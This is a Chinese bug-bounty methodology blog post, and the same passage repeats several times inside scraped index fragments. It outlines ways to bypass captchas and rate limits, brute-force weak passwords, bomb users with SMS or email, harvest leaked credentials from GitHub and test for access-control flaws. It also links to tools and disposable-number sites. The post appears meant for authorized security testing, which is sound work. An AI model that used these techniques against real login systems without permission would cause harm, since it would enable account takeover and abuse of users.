这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#弱口令漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#注册登录找回密码处的短信邮箱轰炸漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#逻辑缺陷的导致的任意用户注册登录找回密码漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#常见的信息泄露漏洞"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ https://yunduanxin.net/China-Phone-Number/ https://www.materialtools.com/ 绕过限制导致的爆破、撞库、用户遍历漏洞最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势: 验证码不刷新 验证码抓包绕过 验证码删除绕过 验证码置空绕过 修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP 账号后加空格绕过账号错误次数限制。 一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。 弱口令漏洞没有验证码或者验证码可以绕过的情况 直接上一手字典爆破，当然还是有一些小技巧: 比如可以设置固定的弱密码，比如123456，然后爆破账号。 比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章: https://xz.aliyun.com/t/7823 https://github.com/huyuanzhi2/password_brute_dictionary 有验证码且无法绕过的情况 github直接找员工账号邮箱，密码。 源码或者js文件查找线索，邮箱，或者加密的账号密码。 特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。 手动尝试常见弱口令。 注册、登录、找回密码处的短信\\邮箱轰炸漏洞这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势: 加空格绕过 加任意字母绕过 前面加86绕过 xff头伪造ip绕过 逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候 类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大: https://www.freebuf.com/author/yangyangwithgnu 常见的信息泄露漏洞敏感信息泄露的范围很广，我认为一般就是两大类， 因为配置错误或者管理不当导致的企业内部信息泄露。 因为逻辑缺陷导致的用户资料泄露(遍历)。 github导致的信息泄露 P牛知识星球里分享的github搜索关键词:https://twitter.com/obheda12/status/1316513838716551169 github子域名监控项目:https://github.com/FeeiCN/GSIL 常见的泄露内容: 员工内部邮箱、登录账号、密码。 企业的一些内部系统域名、ip泄露。 企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。 乌云上有一些案例，可以看一看。 配置错误导致的信息泄露包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。 我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描 比如: 备份文件的小字典 springboot泄露的小字典 网站后台的小字典 比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。 可视化的比如TEST404系列、御剑扫描器使用体验也不错。 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。 越权导致的信息泄露很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。 推荐几个burp插件: 未授权检测： https://github.com/theLSA/burp-unauth-checker 敏感参数提取：https://github.com/theLSA/burp-sensitive-param-extractor 信息提取：https://github.com/theLSA/burp-info-extractor 插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。 常见的一些越权情况: 基于用户ID的越权 基于功能对象ID的越权 基于上传对象ID的越权 基于未授权访问的越权 基于功能地址的越权 基于接口身份的越权 ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:2","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#github导致的信息泄露"},{"categories":["学习"],"content":" 捡中低危漏洞的一些技巧刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。 框架注入 明文密码传输 表单破解漏洞 IIS短文件名泄露 老旧过期的HTTPS服务 跨目录下载漏洞 目录可浏览漏洞 LFI本地文件包含漏洞 RFI远程文件包含漏洞 HTTP拒绝服务攻击 弱口令登录 CSRF跨站点请求伪造 Flash点击劫持 SQL注入漏洞 XSS跨站脚本漏洞 文件上传漏洞 解析漏洞:IIS解析漏洞 解析漏洞:Apache解析漏洞 Cookies注入漏洞 越权访问漏洞 命令执行漏洞 Struts2远程代码执行漏洞 业务逻辑漏洞 用户隐私泄露 敏感信息泄漏(运维) 敏感信息泄漏(研发) 敏感文件泄漏(运维)(配置) 敏感文件泄漏(运维)(权限) 未验证的重定向和传递 Flash跨域访问资源 测试文件泄漏 开启危险的HTTP方法 HTTP参数污染 Unicode编码绕过 源码泄漏 后台目录泄漏 链接注入漏洞 SSRF服务器请求伪造 jsonp劫持 学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。 乌云漏洞库:https://wooyun.x10sec.org/ hackone报告：https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA 提取码:2klt 这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。 登录框处常见的一些漏洞在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。 现在还能用的接码平台: http://www.114sim.com/ 